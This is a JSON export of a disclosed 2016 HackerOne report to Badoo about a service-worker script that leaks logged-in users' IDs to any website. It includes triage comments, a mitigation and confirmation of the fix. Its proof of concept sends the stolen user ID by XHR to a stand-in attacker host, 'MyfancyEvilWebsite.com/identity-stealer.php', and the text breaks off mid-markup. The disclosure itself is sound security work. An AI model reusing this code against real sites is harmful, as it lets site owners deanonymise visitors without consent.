{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-06-03T10:52:33.111Z", 
    "voters": [
        "malcolmx", 
        "saeedhashem", 
        "4nub15", 
        "jineesh4k", 
        "spetr0x", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "280.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 139192, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-06-03T12:53:34.140Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Ability to collect users' ids that have visited a specific web page with malicious code ", 
    "is_member_of_team?": null, 
    "vote_count": 6, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2025, 
            "content": "Despite this issue was reported in #130453 first, there was some misunderstanding. Reporter in #130453 was quite aggressive and unpleasant instead of describing in details what's wrong. Moreover, he wrote an article about this on [public resource]( https://www.seekurity.com/blog/general/badoo-hotornot-privacy-disclosure-feature-not-a-bug/).\n\n@saeedhashem on the other hand was quite kind and informative. That's why we decided to award this report with the bounty, not the first one.\n\nGuys please be informative and patient. We do value every single report to our program but there can be some misunderstandings because of huge amount of crap. \nPlease read our [rules](https://hackerone.com/badoo) carefully before submitting bugs.", 
            "content_html": "<p>Despite this issue was reported in <a href=\"/reports/130453\">#130453</a> first, there was some misunderstanding. Reporter in <a href=\"/reports/130453\">#130453</a> was quite aggressive and unpleasant instead of describing in details what&#39;s wrong. Moreover, he wrote an article about this on <a href=\"/redirect?signature=e3f5bfffb83c1e953fd1d2de5422e186be903219&amp;url=https%3A%2F%2Fwww.seekurity.com%2Fblog%2Fgeneral%2Fbadoo-hotornot-privacy-disclosure-feature-not-a-bug%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>public resource</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p><a href=\"/saeedhashem\">@saeedhashem</a> on the other hand was quite kind and informative. That&#39;s why we decided to award this report with the bounty, not the first one.</p>\n\n<p>Guys please be informative and patient. We do value every single report to our program but there can be some misunderstandings because of huge amount of crap. <br>\nPlease read our <a href=\"https://hackerone.com/badoo\">rules</a> carefully before submitting bugs.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2026, 
            "content": "I truly appreciate the team's decision , and thank you @uyga for your kind words about me .\n\nBut , since the reporter of the initial report  @symbiansymoh is a friend and colleague of mine , I don't really like him being described with such words in my report , many thanks to him for discovering and disclosing the vulnerability , that's what pointed me to it in the first place .\n\nI think @symbiansymoh should've put the very same effort he made writing his blog post in his report instead , misunderstanding happens all the time .\n\nI also think @uyga should've put one or two additional team members to help each other for a better understanding of the issue , even if their was lack of information in the report .\n\nAnyway , we all learn new things every day and this was a lesson to learn for all of us .\n\nThanks again @uyga ,\nThanks again @symbiansymoh ,", 
            "content_html": "<p>I truly appreciate the team&#39;s decision , and thank you <a href=\"/uyga\">@uyga</a> for your kind words about me .</p>\n\n<p>But , since the reporter of the initial report  <a href=\"/symbiansymoh\">@symbiansymoh</a> is a friend and colleague of mine , I don&#39;t really like him being described with such words in my report , many thanks to him for discovering and disclosing the vulnerability , that&#39;s what pointed me to it in the first place .</p>\n\n<p>I think <a href=\"/symbiansymoh\">@symbiansymoh</a> should&#39;ve put the very same effort he made writing his blog post in his report instead , misunderstanding happens all the time .</p>\n\n<p>I also think <a href=\"/uyga\">@uyga</a> should&#39;ve put one or two additional team members to help each other for a better understanding of the issue , even if their was lack of information in the report .</p>\n\n<p>Anyway , we all learn new things every day and this was a lesson to learn for all of us .</p>\n\n<p>Thanks again <a href=\"/uyga\">@uyga</a> ,<br>\nThanks again <a href=\"/symbiansymoh\">@symbiansymoh</a> ,</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-07-03T10:52:33.340Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$280", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/285/f5821c80a5d4b04adb008cc7144216ee576f9579/17_May_2016_12-41-38.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225345Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d2b42046af9573488053e0edd59ec6306410be8b47218fece0c014c88ee76622", 
                    "type": "image/png", 
                    "id": 94285, 
                    "filename": "17_May_2016_12-41-38.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/284/42907f3e20bb9381acb76f012381f0e17ab99bf8/17_May_2016_12-40-43.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225345Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b44b5ebe5ca047c7707886b905223d4cd9c6385132472bfa90d99b8e394d23b0", 
                    "type": "image/png", 
                    "id": 94284, 
                    "filename": "17_May_2016_12-40-43.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-05-17T11:43:46.501Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T11:43:46.501Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Hey @saeedhashem!\nThank you very much for the clarification. \nBut in this case what's the difference between user_id in that script and user_id on every page of different sites? For instance we have user_id in main page source as well as Facebook does - see attached screenshots please.", 
            "markdown_message": "<p>Hey <a href=\"/saeedhashem\">@saeedhashem</a>!<br>\nThank you very much for the clarification. <br>\nBut in this case what&#39;s the difference between user_id in that script and user_id on every page of different sites? For instance we have user_id in main page source as well as Facebook does - see attached screenshots please.</p>\n", 
            "type": "Activities::Comment", 
            "id": 961058, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T12:55:55.014Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T12:55:55.014Z", 
            "actor": {
                "username": "saeedhashem", 
                "url": "/saeedhashem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/028/654321f0c16740b3b8c733fb78031d35badc1d5c_medium.jpg?1446610887"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Hey @uyga \n\nI'm very glad to clarify this for the team .\n\nOn Facebook or on Badoo profiles , the user disclosed user id is in the html source code and there's no way that can allow any script on a foreign domain to call the html response body , otherwise it would a significant [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) and [SOP](https://en.wikipedia.org/wiki/Same-origin_policy) violations . \n\nLet's recall what I've mentioned in the report :\n\n>What made the vulnerability appear ?\n(1)This script https://badoo.com/worker-scope/chrome-service-worker.js?ws=1 being contained information dependent on the currently logged in user .\n(2)This information can identify the currently logged in user.\n(3)The same script being public , and can be called and fetched by any rogue script on any website .\n\n\nLet's compare between the the two files `view-source:https://www.facebook.com/` and `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` to see which of them applies to the mention terms :\n\n`view-source:https://www.facebook.com/` applies to point `1` and `2` but doesn't apply to point three , because the html body of the facebook page can't be called by any scripts hosted outside facebook.com because it's text/html file , that due to the protection of the Cross-Origin Resource Sharing (CORS) mechanism .\n\nOn the other hand ,\n`https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` applies to point `1` , `2` and `3` , so the difference here is the ability to call the file and fetch its content by an outsider rogue script .\n\n\nI hope this was clear enough to differentiate between calling and fetching a remote html page and a remote js file , please let me know if it wasn't .\n\nSome references on CORS and SOP :\n\nhttps://en.wikipedia.org/wiki/Cross-origin_resource_sharing\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\nhttps://en.wikipedia.org/wiki/Same-origin_policy\nhttps://www.linkedin.com/pulse/abusing-insecure-cors-bypassing-csrf-protection-without-pundir\n\nThanks ,\n\nSaeed H.\n", 
            "markdown_message": "<p>Hey <a href=\"/uyga\">@uyga</a> </p>\n\n<p>I&#39;m very glad to clarify this for the team .</p>\n\n<p>On Facebook or on Badoo profiles , the user disclosed user id is in the html source code and there&#39;s no way that can allow any script on a foreign domain to call the html response body , otherwise it would a significant <a href=\"/redirect?signature=fe78536e3f1ac7a14a6bc39bd78fb2bc2921f529&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-origin_resource_sharing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CORS</span><i class=\"icon-external-link\"></i></a> and <a href=\"/redirect?signature=a73778c0baec7060bf2f6780af217ad93f4685b0&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSame-origin_policy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>SOP</span><i class=\"icon-external-link\"></i></a> violations . </p>\n\n<p>Let&#39;s recall what I&#39;ve mentioned in the report :</p>\n\n<blockquote>\n<p>What made the vulnerability appear ?<br>\n(1)This script <a title=\"https://badoo.com/worker-scope/chrome-service-worker.js?ws=1\" href=\"/redirect?signature=99605ce8ef6eea5ed308a9a022f427cd177b65b6&amp;url=https%3A%2F%2Fbadoo.com%2Fworker-scope%2Fchrome-service-worker.js%3Fws%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://badoo.com/worker-scope/chrome-service-worker.js?ws=1</span><i class=\"icon-external-link\"></i></a> being contained information dependent on the currently logged in user .<br>\n(2)This information can identify the currently logged in user.<br>\n(3)The same script being public , and can be called and fetched by any rogue script on any website .</p>\n</blockquote>\n\n<p>Let&#39;s compare between the the two files <code>view-source:https://www.facebook.com/</code> and <code>https://badoo.com/worker-scope/chrome-service-worker.js?ws=1</code> to see which of them applies to the mention terms :</p>\n\n<p><code>view-source:https://www.facebook.com/</code> applies to point <code>1</code> and <code>2</code> but doesn&#39;t apply to point three , because the html body of the facebook page can&#39;t be called by any scripts hosted outside facebook.com because it&#39;s text/html file , that due to the protection of the Cross-Origin Resource Sharing (CORS) mechanism .</p>\n\n<p>On the other hand ,<br>\n<code>https://badoo.com/worker-scope/chrome-service-worker.js?ws=1</code> applies to point <code>1</code> , <code>2</code> and <code>3</code> , so the difference here is the ability to call the file and fetch its content by an outsider rogue script .</p>\n\n<p>I hope this was clear enough to differentiate between calling and fetching a remote html page and a remote js file , please let me know if it wasn&#39;t .</p>\n\n<p>Some references on CORS and SOP :</p>\n\n<p><a title=\"https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\" href=\"/redirect?signature=fe78536e3f1ac7a14a6bc39bd78fb2bc2921f529&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-origin_resource_sharing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://en.wikipedia.org/wiki/Cross-origin_resource_sharing</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\" href=\"/redirect?signature=42cd2481155c12fcaca331ef122f17f9f9f76e88&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FAccess_control_CORS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://en.wikipedia.org/wiki/Same-origin_policy\" href=\"/redirect?signature=a73778c0baec7060bf2f6780af217ad93f4685b0&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSame-origin_policy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://en.wikipedia.org/wiki/Same-origin_policy</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://www.linkedin.com/pulse/abusing-insecure-cors-bypassing-csrf-protection-without-pundir\" href=\"/redirect?signature=7bdc40732e04dc40779fd5c70415034385027c94&amp;url=https%3A%2F%2Fwww.linkedin.com%2Fpulse%2Fabusing-insecure-cors-bypassing-csrf-protection-without-pundir\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.linkedin.com/pulse/abusing-insecure-cors-bypassing-csrf-protection-without-pundir</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Thanks ,</p>\n\n<p>Saeed H.</p>\n", 
            "type": "Activities::Comment", 
            "id": 961153, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T13:03:59.510Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T13:03:59.510Z", 
            "actor": {
                "username": "saeedhashem", 
                "url": "/saeedhashem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/028/654321f0c16740b3b8c733fb78031d35badc1d5c_medium.jpg?1446610887"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "A suggested mitigation for the issue :\n\nOne of the most efficient mitigation I saw for such issues is setting a random token dependent on the current session , and since no one can figure out this random token , then there's no one can call the script except the current user .\n\nSomething like :\n`https://badoo.com/worker-scope/chrome-service-worker.js?ws=1&token=[RANDOM_TOKEN]`\n\nSo any one will call the `chrome-service-worker.js` without the token parameter will get __Not Found__ .\n\nBest regards ,\nThanks ,", 
            "markdown_message": "<p>A suggested mitigation for the issue :</p>\n\n<p>One of the most efficient mitigation I saw for such issues is setting a random token dependent on the current session , and since no one can figure out this random token , then there&#39;s no one can call the script except the current user .</p>\n\n<p>Something like :<br>\n<code>https://badoo.com/worker-scope/chrome-service-worker.js?ws=1&amp;token=[RANDOM_TOKEN]</code></p>\n\n<p>So any one will call the <code>chrome-service-worker.js</code> without the token parameter will get <strong>Not Found</strong> .</p>\n\n<p>Best regards ,<br>\nThanks ,</p>\n", 
            "type": "Activities::Comment", 
            "id": 961165, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T13:49:56.168Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T13:49:56.168Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Thank you, @saeedhashem!\nWe'd like to award you with the bounty. \nIn spite of this issue was raised in #130453 first, you were polite and kind.\nGood luck in bug hunting.", 
            "markdown_message": "<p>Thank you, <a href=\"/saeedhashem\">@saeedhashem</a>!<br>\nWe&#39;d like to award you with the bounty. <br>\nIn spite of this issue was raised in <a href=\"/reports/130453\">#130453</a> first, you were polite and kind.<br>\nGood luck in bug hunting.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 961235, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-05-17T13:50:38.705Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T13:50:38.705Z", 
            "actor": {
                "url": "/badoo", 
                "profile": {
                    "name": "Badoo"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/926/41dc40306393e02776cb53d4cc595966a88e6c6e_medium.png?1496674414"
                }
            }, 
            "team_handle": "badoo", 
            "bounty_amount": "280.0", 
            "collaborator": {
                "username": "saeedhashem", 
                "url": "/saeedhashem"
            }, 
            "message": "Thanks.", 
            "markdown_message": "<p>Thanks.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 961239, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T14:22:18.863Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T14:22:18.863Z", 
            "actor": {
                "username": "saeedhashem", 
                "url": "/saeedhashem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/028/654321f0c16740b3b8c733fb78031d35badc1d5c_medium.jpg?1446610887"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Oh , thank you .\n\nThat was quick , it was totally okay with me if you reopened the original report and closed this as a duplicate though .\n\nBut anyway thanks again for the bounty , although I thought it would worth more :)", 
            "markdown_message": "<p>Oh , thank you .</p>\n\n<p>That was quick , it was totally okay with me if you reopened the original report and closed this as a duplicate though .</p>\n\n<p>But anyway thanks again for the bounty , although I thought it would worth more :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 961310, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T21:34:30.172Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T21:37:11.264Z", 
            "actor": {
                "username": "saeedhashem", 
                "url": "/saeedhashem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/028/654321f0c16740b3b8c733fb78031d35badc1d5c_medium.jpg?1446610887"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Hey ,\n\nI can see that the issue has been fixed by adding the `rt=` session specific token to the request .\n\nGood job .", 
            "markdown_message": "<p>Hey ,</p>\n\n<p>I can see that the issue has been fixed by adding the <code>rt=</code> session specific token to the request .</p>\n\n<p>Good job .</p>\n", 
            "type": "Activities::Comment", 
            "id": 995721, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "saeedhashem", 
                "url": "/saeedhashem"
            }, 
            "created_at": "2016-06-03T10:01:20.269Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-03T10:01:20.269Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Hey. This was fixed. Thank you very much.", 
            "markdown_message": "<p>Hey. This was fixed. Thank you very much.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 997934, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-03T10:52:33.210Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-03T10:52:33.210Z", 
            "actor": {
                "username": "saeedhashem", 
                "url": "/saeedhashem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/028/654321f0c16740b3b8c733fb78031d35badc1d5c_medium.jpg?1446610887"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "first_to_agree": true, 
            "message": "You're welcome .\nLet's disclose this if you don't mind .\n\nThanks ,\n\n", 
            "markdown_message": "<p>You&#39;re welcome .<br>\nLet&#39;s disclose this if you don&#39;t mind .</p>\n\n<p>Thanks ,</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 998003, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-03T12:52:12.638Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-03T12:52:12.638Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "Sure, thanks.", 
            "markdown_message": "<p>Sure, thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 998144, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-03T12:53:34.250Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-03T12:53:34.250Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 998146, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-03T12:53:34.404Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-03T12:53:34.404Z", 
            "actor": {
                "username": "uyga", 
                "url": "/uyga", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/780/355256ffe8c574b39c48589f7becd6880c6a790e_medium.jpg?1459504348"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "badoo", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 998147, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "saeedhashem", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/saeedhashem", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/043/028/7f68fb06d5b9106dec1661c15e81ce5f88efac09_small.jpg?1446610887"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -76593672.29831676, 
    "disclosed_at": "2016-06-03T12:53:34.363Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/139192", 
    "created_at": "2016-05-16T20:31:32.679Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hey ,</p>\n\n<p>Regarding this report <a href=\"/reports/130453\">#130453</a> , I&#39;m pretty sure that there&#39;s a little misunderstanding of the issue , so please let me clarify the issue a bit more .</p>\n\n<p>The issue is not about the disclosure of user&#39;s id , that wouldn&#39;t be considered an issue at all because every website puts user&#39;s id in the user&#39;s profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  </p>\n\n<p>Let&#39;s clarify a bit further by some details and exploit scenario .</p>\n\n<h3 id=\"what-made-the-vulnerability-appear\">What made the vulnerability appear ?</h3>\n\n<ol>\n<li>This script <code>https://badoo.com/worker-scope/chrome-service-worker.js?ws=1</code> being contained information dependent on the currently logged in user .</li>\n<li>This information can identify the currently logged in user.</li>\n<li>The same script being public , and can be called and fetched by any rogue script on any website  .</li>\n</ol>\n\n<h3 id=\"what-makes-it-an-issue\">What makes it an issue ?</h3>\n\n<p>It&#39;s considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .</p>\n\n<p>Additionally the issue allows any one to figure out weather I&#39;m logged in or logged out , and by which account .</p>\n\n<h3 id=\"how-can-any-one-exploit-the-issue-maliciously\">How can any one exploit the issue maliciously ?</h3>\n\n<p>Let&#39;s consider the following as an exploit scenario .</p>\n\n<p>I&#39;m a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .</p>\n\n<p>So , I designed a plan as following :</p>\n\n<ol>\n<li>Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .</li>\n<li>The new product page should contain the Exploit code written below .</li>\n</ol>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">https://badoo.com/worker-scope/chrome-service-worker.js?ws=1</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n<span class=\"kd\">function</span> <span class=\"nx\">UnmaskUser</span><span class=\"p\">(</span><span class=\"nx\">str</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"k\">return</span> <span class=\"nx\">str</span><span class=\"p\">.</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"s1\">&#39;=&#39;</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n<span class=\"p\">}</span>\n<span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onload</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n<span class=\"kd\">var</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">UnmaskUser</span><span class=\"p\">(</span><span class=\"nx\">user_id</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">xhr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">XMLHttpRequest</span><span class=\"p\">();</span>\n<span class=\"nx\">xhr</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s1\">&#39;GET&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;http://MyfancyEvilWebsite.com/identity-stealer.php?victim=&#39;</span> <span class=\"nx\">user</span> <span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n<span class=\"nx\">xhr</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">();</span>\n<span class=\"p\">};</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>And the <code>identity-stealer.php</code> should have the code :</p>\n<pre class=\"highlight 